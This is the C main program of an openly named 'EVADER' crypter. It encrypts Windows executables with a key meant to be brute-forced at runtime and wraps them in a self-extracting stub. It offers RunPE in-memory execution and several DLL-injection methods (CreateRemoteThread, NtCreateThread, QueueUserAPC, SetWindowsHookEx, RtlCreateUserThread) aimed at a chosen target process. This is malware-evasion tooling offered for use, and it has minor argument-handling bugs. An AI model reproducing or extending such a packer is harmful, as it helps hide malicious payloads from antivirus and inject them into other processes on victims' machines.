#include "PackRoutines-Packer.h"

const char sfxStubFile[] = "UnpackStub.exe";

void newfile(char* filename, long size) {
	printf("\xd  --> %s [%d]\n", filename, size);
}

void fileprogress(long pos) {
	printf("%ld                 \xd", pos);
}

int main(int argc, char* argv[]) {

	printf("EVADER project v1.0\n");

	// display usage
	if (argc < 5) {
		printf(
			"EVADER project v1.0\n"
			"usage:\n"
			" Packer.exe inputfile_Path(like c:\\users\\xxx\\files\\ whilc containst your files/file) outputfile_name(like c:\\users\\xxx\\output\\output.exe) KEY_SIZE KEY_START_ASCII KEY_END_ASCII\n"
			" example:\n"
			" Packer c:\\users\\xxx\\files\\ c:\\users\\xxx\\files\\ 7 65 90"
			"Thic commands encrypt all files(.exe) inside c:\\users\\xxx\\files\\ and write output to c:\\users\\xxx\\output\\output.exe with key size 7 and from AAAA(65.65.65.65) to ZZZZ(90.90.90.90)"
			"\n\n\n"
		);
		return 0;
	}

	printf(
		"\n\n"
		"   0) Run PE                   (execute payload directy inside memory of current process address space)\n"
		"   1) CreateRemoteThread       (DLL injection by CreateRemoteThread Win32 API)\n"
		"   2) NtCreateThread           (DLL injection by NtCreateThread native API)\n"
		"   3) QueueUserAPC             (DLL injection by adding user-mode asychronous procedure call(APC) object to the APC queue of specified thread)\n"
		"   4) SetWindowsHookEx         (DLL injection by setting a windows hook)\n"
		"   5) RtlCreateUserThread      (DLL injection by RtlCreateUserThread native API)\n"
		"\n\n"
	);

	int exeMethod = -1;
	char szProc[80];

	printf("Choose payload execution method : ");
	scanf("%d", &exeMethod);

	if (exeMethod > 0) {
		printf("Target process name : ");
		scanf_s("%79s", szProc, 79);
	}
	else {
		strcpy(szProc, "xxxxxxxx");
	}


	int KEY_SIZE;
	int START_ASCII;
	int END_ASCII;

	// set packer's callback info
	packcallbacks_t pcb;
	pcb.fileprogress = fileprogress;
	pcb.newfile = newfile;

	// set encryption key size and complexicity
	KEY_SIZE = atoi(argv[3]);
	START_ASCII = atoi(argv[4]);
	END_ASCII = atoi(argv[5]);
	
	// create archive file
	int rc = packfilesEx(argv[1], (char*)("*.exe"), argv[2], KEY_SIZE, START_ASCII, END_ASCII, exeMethod, szProc, &pcb);
	printf("               \n");

	if (rc != packerrorSuccess) {
		printf("%s\n", packerrors_str[rc]);
		return 1;
	}

	if (GetFileAttributes(sfxStubFile) == (DWORD)-1)
	{
		printf("SFX stub file not found!");
		return 1;
	}

	// open archive file
	FILE *fpArc = fopen(argv[2], "rb");
	if (!fpArc)
	{
		printf("Failed to open archive!\n");
		return 1;
	}

	// get archive size
	fseek(fpArc, 0, SEEK_END);
	long arcSize = ftell(fpArc);
	rewind(fpArc);

	// form output sfx file name
	char sfxName[MAX_PATH];
	strcpy(sfxName, argv[2]);
	strcat(sfxName, ".exe");
			
	// take a copy from SFX
	if (!CopyFile(sfxStubFile, sfxName, FALSE))
	{
		fclose(fpArc);
		printf("Could not create SFX file!\n");
		return 1;
	}
	
	// append data to SFX
	FILE *fpSfx = fopen(sfxName, "rb+");
	fseek(fpSfx, 0, SEEK_END);

	// get SFX size before archive appending
	long sfxSize = ftell(fpSfx);

	// start appending from archive file to the end of SFX file
	char buffer[4096 * 2];
	while (arcSize > 0)
	{
		long rw = arcSize > sizeof(buffer) ? sizeof(buffer) : arcSize;
		fread(buffer, rw, 1, fpArc);
		fwrite(buffer, rw, 1, fpSfx);
		arcSize -= rw;
	}
	fclose(fpArc);
	fclose(fpSfx);

	// mark archive data position inside SFX
	SfxSetInsertPos(sfxName, sfxSize);

	// delete archive file while keeping only the SFX
	DeleteFile(argv[2]);

	printf("SFX created: %s\n", sfxName);

	return 0;
}